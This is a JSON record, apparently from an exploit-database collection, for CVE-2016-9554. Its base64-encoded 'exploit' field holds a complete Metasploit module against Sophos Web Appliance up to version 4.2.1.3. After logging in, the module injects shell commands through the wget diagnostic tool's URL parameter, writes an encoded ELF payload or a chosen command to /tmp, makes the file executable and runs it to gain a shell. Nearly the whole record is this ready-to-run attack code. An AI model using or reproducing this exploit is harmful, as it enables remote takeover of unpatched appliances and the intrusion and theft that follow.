{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBTb3Bob3MgV2ViIEFwcGxpYW5jZSBkaWFnbm9zdGljX3Rvb2xzIHdnZXQgUmVtb3RlIENvbW1hbmQgSW5qZWN0aW9uIFZ1bG5lcmFibGl0eSANCiMgRGF0ZTogMTIvMTIvMjAxNg0KIyBFeHBsb2l0IEF1dGhvcjogeG9ydCBAIENyaXRpY2FsIFN0YXJ0DQojIFZlbmRvciBIb21lcGFnZTogd3d3LnNvcGhvcy5jb20NCiMgU29mdHdhcmUgTGluazogc29waG9zLmNvbS9lbi11cy9wcm9kdWN0cy9zZWN1cmUtd2ViLWdhdGV3YXkuYXNweA0KIyBWZXJzaW9uOiA0LjIuMS4zDQojIFRlc3RlZCBvbjogNC4yLjEuMw0KIyAgICAgICAgICAgIA0KIyBDVkUgOiBDVkUtMjAxNi05NTU0DQoNCiMgdnVsbjogIGRpYWdub3N0aWNfdG9vbHMgY29tbWFuZCAvIGhvc3QgcGFyYW1ldGVyIC8gIE1nclJlcG9ydC5waHAgZXhwbG9pdA0KDQojIERlc2NyaXB0aW9uIFBvc3RBdXRoIFNvcGhvcyBXZWIgQXBwIEZXIDw9IHY0LjIuMS4zIGZvciBjYXBhYmxpdGllcy4gVGhpcyBleHBsb2l0IGxldmVyYWdlcyBhIGNvbW1hbmQgaW5qZWN0aW9uIGJ1Zy4gDQojDQojIHhvcnQgQCBDcml0aWNhbCBTdGFydA0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoJUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCglpbmNsdWRlICBFeHBsb2l0OjpSZW1vdGU6OlRjcA0KICAgICAgICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQoJCXN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQoJCQknTmFtZScgICAgICAgICAgID0+ICdTb3Bob3MgV2ViIEFwcGxpYWNlIDw9IHY0LjIuMS4zIHJlbW90ZSBleHBsb2l0JywNCgkJCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSByZW1vdGUgY29tbWFuZCBleGVjdXRpb24gdnVsbmVyYWJpbGl0eSBpbg0KCQkJCXRoZSBTb3Bob3MgV2ViIEFwcGxpYWNlIFZlcnNpb24gPD0gIHY0LjIuMS4zLiBUaGUgdnVsbmVyYWJpbGl0eSBleGlzdCBpbg0KCQkJCWEgc2VjdGlvbiBvZiB0aGUgbWFjaGluZSdzIGFkbWluc3RyYXRpdmUgaW5mZXJ0ZmFjZSBmb3IgcGVyZm9ybWluZyBkaWFnbm9zdGljDQoJCQkJbmV0d29yayB0ZXN0IHdpdGggd2dldCBhbmQgdW5zYW5pdGl6ZWQgdW5zZXIgc3VwcGxpZWQgaW5mb3JtYXRpb24uIA0KCQkJfSwNCgkJCSdBdXRob3InICAgICAgICAgPT4NCgkJCQlbDQoJCQkJCSd4b3J0QENyaXRpY2FsIFN0YXJ0JywgIyB2dWxuICsgbWV0YXNwbG9pdCBtb2R1bGUNCgkJCQldLA0KCQkJJ1ZlcnNpb24nICAgICAgICA9PiAnJFJldmlzaW9uOiAxICQnLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnbm9uZScsICdub25lJ10sDQoJCQkJXSwNCgkJCSdQbGF0Zm9ybScgICAgICA9PiBbICdsaW51eCddLA0KCQkJJ1ByaXZpbGVnZWQnICAgICA9PiB0cnVlLA0KCQkJICdBcmNoJyAgICAgICAgICA9PiBbIEFSQ0hfWDg2IF0sDQogICAgICAgICAgICAgICAgICAgICAgICAnU2Vzc2lvblR5cGVzJyAgPT4gWyAnc2hlbGwnIF0sDQogICAgICAgICAgICAgICAgICAgICAgICAnUHJpdmlsZWdlZCcgICAgID0+IGZhbHNlLA0KDQoJCSAgICAgICAgJ1BheWxvYWQnICAgICAgICA9Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb21wYXQnID0+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb25uZWN0aW9uVHlwZScgPT4gJ2ZpbmQnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwNCg0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWydMaW51eCBVbml2ZXJzYWwnLA0KCQkJCQkJew0KCQkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ2xpbnV4Jw0KCQkJCQkJfQ0KCQkJCQldLA0KCQkJCV0sDQoJCQknRGVmYXVsdFRhcmdldCcgPT4gMCkpDQoNCgkJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQkJWw0KCQkJCQlPcHRTdHJpbmcubmV3KCdQQVNTV09SRCcsIFsgZmFsc2UsICdEZXZpY2UgcGFzc3dvcmQnLCAiIiBdKSwJDQoJCQkgICAgICAgICAJT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbIHRydWUsICdEZXZpY2UgcGFzc3dvcmQnLCAiYWRtaW4iIF0pLAkNCgkJCQkJT3B0U3RyaW5nLm5ldygnQ01EJywgWyBmYWxzZSwgJ0NvbW1hbmQgdG8gZXhlY3V0ZScsICIiIF0pLAkNCgkJCQkJT3B0OjpSUE9SVCg0NDMpLA0KCQkJCV0sIHNlbGYuY2xhc3MpDQoJZW5kDQoNCiAgICAgICAgZGVmIGRvX2xvZ2luKHVzZXJuYW1lLCBwYXNzd29yZF9jbGVhcikNCiAgICAgICAgICAgICAgICB2cHJpbnRfc3RhdHVzKCAiTG9nZ2luZyBpbnRvIG1hY2hpbmUgd2l0aCBjcmVkZW50aWFscy4uLlxuIiApDQoNCiAgICAgICAgICAgICAgICAjIHZhcnMNCiAgICAgICAgICAgICAgICB0aW1lb3V0ID0gMTU1MDsNCiAgICAgICAgICAgICAgICBzdHlsZV9rZXkgPSBSZXg6OlRleHQucmFuZF90ZXh0X2hleCgzMikNCg0KICAgICAgICAgICAgICAgICMgc2VuZCByZXF1ZXN0ICANCiAgICAgICAgICAgICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAnbWV0aG9kJyAgPT4gJ1BPU1QnLA0KICAgICAgICAgICAgICAgICAgICAgICd1cmknICAgICA9PiAiL2luZGV4LnBocCIsDQogICAgICAgICAgICAgICAgICAgICAgJ3ZhcnNfZ2V0JyA9PiB7DQoJCQkgICAnYycgPT4gJ2xvZ2luJywNCgkJCX0sDQogICAgICAgICAgICAgICAgICAgICAgJ3ZhcnNfcG9zdCcgPT4NCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCg0KICAgICAgIAkJCSAgJ1NUWUxFJyA9PiBzdHlsZV9rZXksDQogCQkJICAnZGVzdGluYXRpb24nID0+ICcnLA0KCQkJICAnc2VjdGlvbicgPT4gJycsDQoJCQkgICd1c2VybmFtZScgPT4gdXNlcm5hbWUsDQoJCQkgICdwYXNzd29yZCcgPT4gcGFzc3dvcmRfY2xlYXIsDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSwgdGltZW91dCkNCg0KICAgICAgICAgICAgICAgIHJldHVybiBzdHlsZV9rZXkNCiAgICAgICAgZW5kDQoNCglkZWYgcnVuX2NvbW1hbmQodXNlcm5hbWUsIHN0eWxlX3Bhc3N3b3JkLCBjbWQpDQoNCgkJdnByaW50X3N0YXR1cyggIlJ1bm5pbmcgQ29tbWFuZC4uLlxuIiApDQoNCgkJIyBzZW5kIHJlcXVlc3Qgd2l0aCBwYXlsb2FkCQ0KCQlyZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCgkJCSdtZXRob2QnID0+ICdQT1NUJywNCgkJCSd2YXJzX3Bvc3QnID0+IHsNCgkJCQknYWN0aW9uJyA9PiAnd2dldCcsDQoJCQkJJ3NlY3Rpb24nID0+ICdjb25maWd1cmF0aW9uJywNCgkJCQknU1RZTEUnID0+IHN0eWxlX3Bhc3N3b3JkICwNCgkJCQkndXJsJyA9PiAnaHR0JTNhJTJmJTJmd3d3Lmdvb2dsZS5jb20lMmZgJytjbWQrJ2AnLA0KCQkJCX0sDQoJCQkndmFyc19nZXQnID0+IHsNCgkJCQknYycgPT4gJ2RpYWdub3N0aWNfdG9vbHMnLA0KCQkJfSwNCgkJfSkNCg0KCWVuZA0KDQoJDQoJZGVmIGV4cGxvaXQNCgkJIyB0aW1lb3V0DQoJCXRpbWVvdXQgPSAxNTUwOw0KDQoJCSMgcGFyYW1zDQoJCXBhc3N3b3JkX2NsZWFyID0gZGF0YXN0b3JlWydQQVNTV09SRCddDQoJCXVzZXIgPSBkYXRhc3RvcmVbJ1VTRVJOQU1FJ10NCg0KCQkjIGRvIGF1dGhlbnRpY2F0aW9uCQkNCgkJc3R5bGVfaGFzaCA9IGRvX2xvZ2luKHVzZXIsIHBhc3N3b3JkX2NsZWFyKQ0KCQ0KCQl2cHJpbnRfc3RhdHVzKCJTVEFUVVMgaGFzaCBhdXRoZW50aWNhdGVkOiAje3N0eWxlX2hhc2h9XG4iKQ0KCQkJDQoJCSMgcGF1c2UgdG8gbGV0IHRoaW5ncyBydW4gc21vb3RobHkNCgkJc2xlZXAoNSkNCg0KCQkgI2lmIG5vICdDTUQnIHN0cmluZyAtIGFkZCBjb2RlIGZvciByb290IHNoZWxsDQogICAgICAgICAgICAgICAgaWYgbm90IGRhdGFzdG9yZVsnQ01EJ10ubmlsPyBhbmQgbm90IGRhdGFzdG9yZVsnQ01EJ10uZW1wdHk/DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNtZCA9IGRhdGFzdG9yZVsnQ01EJ10NCg0KICAgICAgICAgICAgICAgICAgICAgICAgIyBFbmNvZGUgY21kIHBheWxvYWQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuY29kZWRfY21kID0gY21kLnVucGFjaygiSCoiKS5qb2luKCkuZ3N1YigvKFx3KShcdykvLCdcXHhcMVwyJykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgIyBraWxsIHN0YWxlIGNhbGxzIHRvIGJkdW1wIGZyb20gcHJldmlvdXMgZXhwbG9pdCBjYWxscyBmb3IgcmUtdXNlDQogICAgICAgICAgICAgICAgICAgICAgICBydW5fY29tbWFuZCh1c2VyLCBzdHlsZV9oYXNoLCAoInN1ZG8lMjAvYmluL3JtJTIwLWYlMjAvdG1wL24lMjA7cHJpbnRmJTIwXCIje2VuY29kZWRfY21kfVwiJTIwPiUyMC90bXAvbjslMjBjaG1vZCUyMCtyeCUyMC90bXAvbjsvdG1wL24iICkpDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgIyBFbmNvZGUgcGF5bG9hZCB0byBFTEYgZmlsZSBmb3IgZGVwbG95bWVudA0KICAgICAgICAgICAgICAgICAgICAgICAgZWxmID0gTXNmOjpVdGlsOjpFWEUudG9fbGludXhfeDg2X2VsZihmcmFtZXdvcmssIHBheWxvYWQucmF3KQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2RlZF9lbGYgPSBlbGYudW5wYWNrKCJIKiIpLmpvaW4oKS5nc3ViKC8oXHcpKFx3KS8sJ1xcXFxcXHhcMVwyJykNCg0KCQkJIyB1cGxvYWQgZWxmIHRvIC90bXAvbSAsIGNobW9kICtyeCAvdG1wL20gLCB0aGVuIHJ1biAvdG1wL20gKHBheWxvYWQpDQogICAgICAgICAgICAgICAgICAgICAgICBydW5fY29tbWFuZCh1c2VyLCBzdHlsZV9oYXNoLCAoImVjaG8lMjAtZSUyMCN7ZW5jb2RlZF9lbGZ9XD4lMjAvdG1wL21cO2NobW9kJTIwJTJicnglMjAvdG1wL21cOy90bXAvbSIpKQ0KDQoJCQkjIHdhaXQgZm9yIG1hZ2ljDQogICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVyDQoJCQkNCiAgICAgICAgICAgICAgICBlbmQNCg0KDQoJZW5kDQojIHNvcGhveC1yZWxlYXNlDQplbmQ=", 
    "filename": "platforms/linux/webapps/41414.rb", 
    "id": "41414", 
    "cves": [
        "CVE-2016-9554"
    ]
}